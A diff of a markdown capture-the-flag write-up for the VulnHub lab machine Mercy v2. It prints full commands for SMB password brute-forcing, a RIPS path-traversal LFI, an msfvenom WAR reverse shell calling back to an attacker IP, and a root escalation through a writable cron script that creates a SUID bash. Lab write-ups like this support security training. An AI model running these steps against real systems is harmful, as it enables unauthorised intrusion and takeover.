@@ -13,7 +13,6 @@ image:
 # Recon
 
 ## NMAP Complete Scan
-
 ```
 # Nmap 7.92 scan initiated Mon Feb  7 19:15:36 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/xml/_full_tcp_nmap.xml 192.168.110.19
 Nmap scan report for 192.168.110.19
@@ -247,9 +246,7 @@ OS and Service detection performed. Please report any incorrect results at https
 ```
 
 ## TCP/8080 (HTTP)
-
 ### FFUF - common.txt
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
 └─# ffuf -u http://$ip:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'
@@ -285,13 +282,11 @@ manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
 robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3]
 :: Progress: [18460/18460] :: Job [1/1] :: 2658 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
 ```
-
 - `host-manager`
 - `robots.txt`
 - `manager`
 
 ### Nikto
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
 └─# nikto -ask=no -h http://192.168.110.19:8080 2>&1 | tee "/root/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/scans/tcp8080/tcp_8080_http_nikto.txt"
@@ -322,13 +317,10 @@ robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3]
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
-
 - `tomcat`CMS
 
 ## TCP/139,445 (SMB)
-
 ### Enum4linux
-
 ```
  ---------------------------------------
 |    Users via RPC on 192.168.110.19    |
@@ -349,13 +341,12 @@ robots.txt              [Status: 200, Size: 45, Words: 3, Lines: 3]
   acb: '0x00000010'
   description: ''
 ```
-
 - Usernames
 	- `pleadformercy`
 	- `qiu`
 
-### Crackmapexec
 
+### Crackmapexec
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
 └─# crackmapexec smb $ip -u 'guest' -p '' --shares
@@ -368,11 +359,9 @@ SMB         192.168.110.19  445    MERCY            print$                      
 SMB         192.168.110.19  445    MERCY            qiu                             
 SMB         192.168.110.19  445    MERCY            IPC$                            IPC Service (MERCY server (Samba, Ubuntu))
 ```
-
 - `qiu` - NO ACCESS
 
 ### SMBMap
-
 ```
 ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
 └─# smbmap -u '' -p '' -H $ip
@@ -383,13 +372,11 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	qiu                                               	NO ACCESS	
 	IPC$                                              	NO ACCESS	IPC Service (MERCY server (Samba, Ubuntu))
 ```
-
 - `qiu` - NO ACCESS
 
 # Initial Foothold
 
 ## TCP/8080 (HTTP) - Hidden Directory
-
 1. View enumerated directories
 	- `examples`
 		![](Pasted%20image%2020220207205610.png)
@@ -400,24 +387,19 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		![](Pasted%20image%2020220207205141.png)
 		- Basic Authentication
 	- `robots.txt`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
 		└─# curl http://$ip:8080/robots.txt
 		User-agent: *
 		Disallow: /tryharder/tryharder
 		```
-
 	- `/tryharder/tryharder`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
 		└─# curl http://$ip:8080/tryharder/tryharder
 		SXQncyBhbm5veWluZywgYnV0IHdlIHJlcGVhdCB0aGlzIG92ZXIgYW5kIG92ZXIgYWdhaW46IGN5YmVyIGh5Z2llbmUgaXMgZXh0cmVtZWx5IGltcG9ydGFudC4gUGxlYXNlIHN0b3Agc2V0dGluZyBzaWxseSBwYXNzd29yZHMgdGhhdCB3aWxsIGdldCBjcmFja2VkIHdpdGggYW55IGRlY2VudCBwYXNzd29yZCBsaXN0LgoKT25jZSwgd2UgZm91bmQgdGhlIHBhc3N3b3JkICJwYXNzd29yZCIsIHF1aXRlIGxpdGVyYWxseSBzdGlja2luZyBvbiBhIHBvc3QtaXQgaW4gZnJvbnQgb2YgYW4gZW1wbG95ZWUncyBkZXNrISBBcyBzaWxseSBhcyBpdCBtYXkgYmUsIHRoZSBlbXBsb3llZSBwbGVhZGVkIGZvciBtZXJjeSB3aGVuIHdlIHRocmVhdGVuZWQgdG8gZmlyZSBoZXIuCgpObyBmbHVmZnkgYnVubmllcyBmb3IgdGhvc2Ugd2hvIHNldCBpbnNlY3VyZSBwYXNzd29yZHMgYW5kIGVuZGFuZ2VyIHRoZSBlbnRlcnByaXNlLg==
 		```
-
 2. Decode the encoded message from `/tryharder/tryharder`
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19]
 	└─# curl -s http://$ip:8080/tryharder/tryharder | base64 -d | tee decoded.txt
@@ -427,17 +409,14 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 
 	No fluffy bunnies for those who set insecure passwords and endanger the enterprise.
 	```
-
 	- Weak passwords?
 3. Bruteforce `host-manager` w/ known tomcat default credentials
 	- Failed
 	![](Pasted%20image%2020220207211845.png)
 
 ## TCP/139,445 (SMB) SMB Fileshare Bruteforce
-
 1. [Bruteforce](https://github.com/yufongg/SMB-Fileshare-Bruteforce) SMB Fileshare
 	![](vmware_rITV3mj9PE.gif)
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
 	└─# ./smb_bruteforce.sh $ip qiu /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt qiu
@@ -455,9 +434,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	└─# cat Results.txt 
 	qiu:password
 	```
-
 2. View SMB Fileshares
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
 	└─# smbmap -H $ip -u 'qiu' -p 'password'
@@ -468,10 +445,8 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		qiu                                               	READ ONLY	
 		IPC$                                              	NO ACCESS	IPC Service (MERCY server (Samba, Ubuntu))
 	```
-
 	- `qiu` - READ ONLY
 3. Download all files from `qiu` fileshare
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 	└─# smbclient //$ip/qiu -U qiu -c 'prompt;recurse;mget *'
@@ -486,9 +461,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	getting file \.private\opensesame\configprint of size 539 as .private/opensesame/configprint (263.2 KiloBytes/sec) (average 7.8 KiloBytes/sec)
 	getting file \.private\opensesame\config of size 17543 as .private/opensesame/config (552.6 KiloBytes/sec) (average 31.9 KiloBytes/sec)
 	```
-
 4. View directory structure
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 	└─# tree -a smb/
@@ -510,7 +483,6 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 			└── smiley
 	6 directories, 9 files
 	```
-
 5. View files
 	- `configprint`
 		![](Pasted%20image%2020220208001316.png)
@@ -523,9 +495,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 			- `17301,28504,9999`
 
 ## Port Knocking 
-
 1. Port Knock
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 	└─# knock -v $ip 159 27391 4
@@ -538,9 +508,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	hitting tcp 192.168.110.19:28504
 	hitting tcp 192.168.110.19:9999
 	```
-
 2. Check for newly opened ports
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 	└─# nmap $ip -p-
@@ -565,14 +533,12 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 
 	Nmap done: 1 IP address (1 host up) scanned in 18.76 seconds
 	```
-
 	- `TCP/80`
 	- `TCP/22`
 
+
 ## Recon on the newly opened ports 
-
 1. nmap complete scan
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 	└─# nmap $ip -A -sV -sC -p22,80 -oN ../scans/new_ports.txt
@@ -608,9 +574,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 	Nmap done: 1 IP address (1 host up) scanned in 21.34 seconds
 	```
-
 2. Directory enumerate `TCP/80 - HTTP`
-
 	```
 	┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
 	└─# ffuf -u http://$ip:80/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'
@@ -644,17 +608,14 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	time                    [Status: 200, Size: 79, Words: 15, Lines: 3]
 	:: Progress: [18460/18460] :: Job [1/1] :: 2255 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
 	```
-
 	- `time`
 	- `robots.txt`
 
 ## TCP/80 (HTTP) - RIPS 0.53 LFI Exploit
-
 1. View enumerated directories
 	- `time`
 		![](Pasted%20image%2020220208004832.png)
 	- `robots.txt`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 		└─# curl -s http://$ip/robots.txt
@@ -662,9 +623,7 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		Disallow: /mercy
 		Disallow: /nomercy
 		```
-
 	- `/mercy/index`
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/loot]
 		└─# curl -s http://$ip/mercy/index
@@ -672,41 +631,34 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 
 		We hope you do not plead for mercy too much. If you do, please help us upgrade our website to allow our visitors to obtain more than just the local time of our system.
 		```
-
 	- `/nomercy`
 		![](Pasted%20image%2020220208005038.png)
 		- `RIPS 0.53`
 2. Search exploits for `RIPS 0.53`
 
+
 	| Exploit Title                              | Path                  |
-
 	| ------------------------------------------ | --------------------- |
-
 	| RIPS 0.53 - Multiple Local File Inclusions | php/webapps/18660.txt |
 
 3. Try `php/webapps/18660.txt`
 	1. POC
-
 		```
 		http://localhost/rips/windows/code.php?file=../../../../../../etc/passwd
 		```
-
 	2. Check for vulnerability
 		![](Pasted%20image%2020220208010019.png)
 	3. Fuzz for files that can lead to RCE
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
 		└─# ffuf -u http://$ip/nomercy/windows/code.php?file=../../../../../../..FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt  -fw 14,5
 		```
-
 		- Could not find any files that could lead to RCE
 	4. At `TCP/8080 - HTTP`, tomcat is running, this will lead us to RCE
 		- Why is it useful?
 			1. We can enumerate tomcat files & locate `tomcat-usr.xml` which contains credentials via the LFI exploit
 			2. If are able to include `tomcat-usr.xml`, we can login & upload a reverse shell at tomcat.
 	5. Tomcat file directory structure
-
 		```
 		/etc/tomcat7/
 		├── Catalina
@@ -743,7 +695,6 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		│           └── context.xml
 		└── work -> ../../cache/tomcat7
 		```
-
 		- `/var/lib/tomcat7/conf/tomcat-users.xml`
 		- `/etc/tomcat7/tomcat-users.xml`
 		- [Good explanation](https://askubuntu.com/a/314614) of tomcat directory structure
@@ -756,20 +707,16 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		- fluffy:freakishfluffybunny
 
 ## TCP/8080 (HTTP) - Tomcat (Upload Reverse Shell)
-
 1. Proceed to `http://192.168.110.19:8080/manager/html` 
 2. Login w/ thisisasuperduperlonguser:heartbreakisinevitable 
 	![](Pasted%20image%2020220208023106.png)
 3. Create our WAR reverse shell payload
 	1. Create WAR reverse shell 
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
 		└─# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.4 LPORT=4444 -f war -o rev86.war
 		```
-
 	2. Find out the jsp file to execute our reverse shell
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2/192.168.110.19/exploit]
 		└─# jar -xvf rev86.war
@@ -780,34 +727,27 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 		 inflated: WEB-INF/web.xml
 		 inflated: jfzomlykmswjkh.jsp
 		```
-
 		- `jfzomlykmswjkh.jsp`
 	3. Deploy `rev86.war`
 	4. Execute reverse shell at 
-
 		```
 		┌──(root💀kali)-[~/vulnHub/Digitalworld.local-Mercy-v2]
 		└─# curl http://192.168.110.19:8080/rev86/jfzomlykmswjkh.jsp
 		```
-
 		![](Pasted%20image%2020220208024203.png)
-
 4. Obtain `tomcat7` shell
 	![](Pasted%20image%2020220208023914.png)
 5. Local Flag
-
 	```
 	cd /   
 	cat local.txt
 	Plz have mercy on me! :-( :-(
 	```
-
+		
 # Privilege Escalation
 
 ## Fluffy - Via Creds Found
-
 1. Earlier we found fluffy's creds at `tomcat-users.xml`, switch to fluffy w/ fluffy:freakishfluffybunny
-
 	```
 	tomcat7@MERCY:/usr/local$ su fluffy
 	Password: 
@@ -816,11 +756,9 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	$ id
 	uid=1003(fluffy) gid=1003(fluffy) groups=1003(fluffy)
 	```
-
+	
 ## Root - Via Cronjob
-
 1. View files in fluffy home directory
-
 	```
 	fluffy@MERCY:~$ find $(pwd)
 	/home/fluffy
@@ -838,10 +776,8 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	/home/fluffy/.private/secrets/.secrets
 	fluffy@MERCY:~$ 
 	```
-
 	- `/.private/secrets`
 2. View files in `/.private/secrets`
-
 	```
 	fluffy@MERCY:~/.private/secrets$ ls -la
 	total 20
@@ -852,10 +788,8 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	-rwxrwxrwx 1 root   root    222 Nov 20  2018 timeclock
 	fluffy@MERCY:~/.private/secrets$ 
 	```
-
 	- `timelock` writable
 3. Snoop processes to see the cronjob being executed
-
 	```
 	tomcat7@MERCY:/tmp$ ./pspy	
 	./pspy
@@ -923,23 +857,19 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	2022/02/08 11:39:01 CMD: UID=0    PID=23418  | /usr/bin/lsof -w -l +d /var/lib/php5 
 	2022/02/08 11:39:01 CMD: UID=0    PID=23421  | /usr/bin/lsof -w -l +d /var/lib/php5 
 	```
-
 	- 2022/02/08 11:36:01: 
 		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock`
 	- 2022/02/08 11:39:01
 		- `/bin/sh -c bash /home/fluffy/.private/secrets/timeclock `
 	- `timeclock` is executed by root cronjob every 3 minutes
 4. Replace `timeclock` w/ a script to create a root shell
-
 	```
 	fluffy@MERCY:~/.private/secrets$ printf '#!/bin/bash\n\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash\n' > timeclock;
 	```
-
 5. Wait for cronjob to execute
 6. Root shell obtained
 	![](Pasted%20image%2020220208034639.png)
 7. Root Flag
-
 	```
 	rootbash-4.3# cat author-secret.txt proof.txt 
 	Hi! Congratulations on being able to root MERCY.
@@ -958,3 +888,4 @@ SMB         192.168.110.19  445    MERCY            IPC$                        
 	The Author
 	Congratulations on rooting MERCY. :-)
 	```
+
